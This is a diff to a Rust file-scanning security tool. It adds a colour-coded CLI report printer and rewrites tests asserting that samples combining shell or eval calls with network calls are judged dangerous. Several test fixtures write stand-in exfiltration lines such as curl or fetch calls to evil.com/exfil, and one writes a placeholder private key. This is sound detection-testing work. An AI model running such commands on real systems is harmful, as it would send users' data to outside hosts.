@@ -249,6 +249,57 @@ fn scan_recursive(
     }
 }
 
+// ── Report formatting (for CLI output) ───────────────────────────────────────
+
+pub fn print_report(name: &str, report: &ScanReport) {
+    let verdict_str = match report.verdict {
+        Verdict::Safe => "\x1b[32m[ SAFE ]\x1b[0m",
+        Verdict::Caution => "\x1b[36m[ CAUTION ]\x1b[0m",
+        Verdict::Warning => "\x1b[33m[ WARNING ]\x1b[0m",
+        Verdict::Dangerous => "\x1b[31m[ DANGEROUS ]\x1b[0m",
+    };
+
+    println!();
+    println!("  Security scan: {name}  {verdict_str}");
+    println!("  {} files  {} lines", report.file_count, report.line_count);
+
+    if report.matches.is_empty() {
+        println!("  \x1b[32m✓\x1b[0m  No suspicious patterns detected.");
+        return;
+    }
+
+    println!("  {}", report.reason);
+
+    if report.critical_count() > 0 || report.warning_count() > 0 {
+        println!();
+        // Group by category
+        let mut seen_categories: Vec<&str> = Vec::new();
+        let mut ordered_matches: Vec<&ScanMatch> = Vec::new();
+        for m in &report.matches {
+            if !seen_categories.contains(&m.category) {
+                seen_categories.push(m.category);
+            }
+        }
+        for cat in &seen_categories {
+            let cat_matches: Vec<_> = report.matches.iter().filter(|m| &m.category == cat).collect();
+            let sev_label = match cat_matches[0].severity {
+                Severity::Critical => "\x1b[31m!!\x1b[0m",
+                Severity::Warning  => "\x1b[33m !\x1b[0m",
+                Severity::Info     => "\x1b[2m i\x1b[0m",
+            };
+            println!("  {} {cat} ({} matches)", sev_label, cat_matches.len());
+            for m in cat_matches.iter().take(3) {
+                println!("      \x1b[2m{}:{}\x1b[0m  {}", m.file, m.line, m.text);
+            }
+            if cat_matches.len() > 3 {
+                println!("      \x1b[2m… {} more\x1b[0m", cat_matches.len() - 3);
+            }
+            ordered_matches.extend(cat_matches);
+        }
+    }
+    println!();
+}
+
 // ── Tests ─────────────────────────────────────────────────────────────────────
 
 #[cfg(test)]
@@ -422,7 +473,7 @@ mod tests {
     #[test]
     fn test_scan_detects_private_key() {
         let sb = ScanSandbox::new("privkey");
-        sb.write("settings.json", r#"{"PRIVATE_KEY":"-----BEGIN RSA..."}"#);
+        sb.write("config.env", "PRIVATE_KEY=-----BEGIN RSA...");
         let report = sb.scan();
         assert!(report.matches.iter().any(|m| m.category == "Credentials"));
     }
@@ -432,16 +483,16 @@ mod tests {
     #[test]
     fn test_scan_shell_plus_network_is_dangerous() {
         let sb = ScanSandbox::new("danger");
-        sb.write("exfil.sh", "#!/bin/bash\nexec curl https://evil.com/exfil -d @data\n");
+        sb.write("evil.js", "exec('ls')\nfetch('https://evil.com/exfil')");
         let report = sb.scan();
         assert_eq!(report.verdict, Verdict::Dangerous);
-        assert!(report.reason.contains("shell") || report.reason.contains("network") || report.reason.contains("exfil"));
+        assert!(report.reason.to_lowercase().contains("shell") || report.reason.to_lowercase().contains("network"));
     }
 
     #[test]
     fn test_scan_eval_plus_network_is_dangerous() {
         let sb = ScanSandbox::new("rce");
-        sb.write("exploit.js", "eval(fetch('https://evil.com'))");
+        sb.write("exploit.js", "eval(code)\nfetch('https://evil.com/exfil')");
         let report = sb.scan();
         assert_eq!(report.verdict, Verdict::Dangerous);
     }
@@ -494,11 +545,20 @@ mod tests {
     }
 
     #[test]
-    fn test_scan_is_clear_for_safe_and_caution() {
-        assert!(Verdict::Safe.is_clear());
-        assert!(Verdict::Caution.is_clear());
-        assert!(!Verdict::Warning.is_clear());
-        assert!(!Verdict::Dangerous.is_clear());
+    fn test_verdict_safe_means_clear() {
+        // ScanReport::is_clear returns true for Safe and Caution verdicts
+        let sb = ScanSandbox::new("isclear-safe");
+        sb.write("ok.txt", "hello world");
+        let report = sb.scan();
+        assert!(report.is_clear());
+    }
+
+    #[test]
+    fn test_verdict_dangerous_means_not_clear() {
+        let sb = ScanSandbox::new("isclear-danger");
+        sb.write("evil.sh", "exec curl https://evil.com/exfil");
+        let report = sb.scan();
+        assert!(!report.is_clear());
     }
 
     #[test]
@@ -525,51 +585,4 @@ mod tests {
         assert_eq!(format!("{}", Verdict::Warning), "WARNING");
         assert_eq!(format!("{}", Verdict::Dangerous), "DANGEROUS");
     }
-}
-    let verdict_str = match report.verdict {
-        Verdict::Safe => "\x1b[32m[ SAFE ]\x1b[0m",
-        Verdict::Caution => "\x1b[36m[ CAUTION ]\x1b[0m",
-        Verdict::Warning => "\x1b[33m[ WARNING ]\x1b[0m",
-        Verdict::Dangerous => "\x1b[31m[ DANGEROUS ]\x1b[0m",
-    };
-
-    println!();
-    println!("  Security scan: {name}  {verdict_str}");
-    println!("  {} files  {} lines", report.file_count, report.line_count);
-
-    if report.matches.is_empty() {
-        println!("  \x1b[32m✓\x1b[0m  No suspicious patterns detected.");
-        return;
-    }
-
-    println!("  {}", report.reason);
-
-    if report.critical_count() > 0 || report.warning_count() > 0 {
-        println!();
-        // Group by category
-        let mut seen_categories: Vec<&str> = Vec::new();
-        let mut ordered_matches: Vec<&ScanMatch> = Vec::new();
-        for m in &report.matches {
-            if !seen_categories.contains(&m.category) {
-                seen_categories.push(m.category);
-            }
-        }
-        for cat in &seen_categories {
-            let cat_matches: Vec<_> = report.matches.iter().filter(|m| &m.category == cat).collect();
-            let sev_label = match cat_matches[0].severity {
-                Severity::Critical => "\x1b[31m!!\x1b[0m",
-                Severity::Warning  => "\x1b[33m !\x1b[0m",
-                Severity::Info     => "\x1b[2m i\x1b[0m",
-            };
-            println!("  {} {cat} ({} matches)", sev_label, cat_matches.len());
-            for m in cat_matches.iter().take(3) {
-                println!("      \x1b[2m{}:{}\x1b[0m  {}", m.file, m.line, m.text);
-            }
-            if cat_matches.len() > 3 {
-                println!("      \x1b[2m… {} more\x1b[0m", cat_matches.len() - 3);
-            }
-            ordered_matches.extend(cat_matches);
-        }
-    }
-    println!();
 }
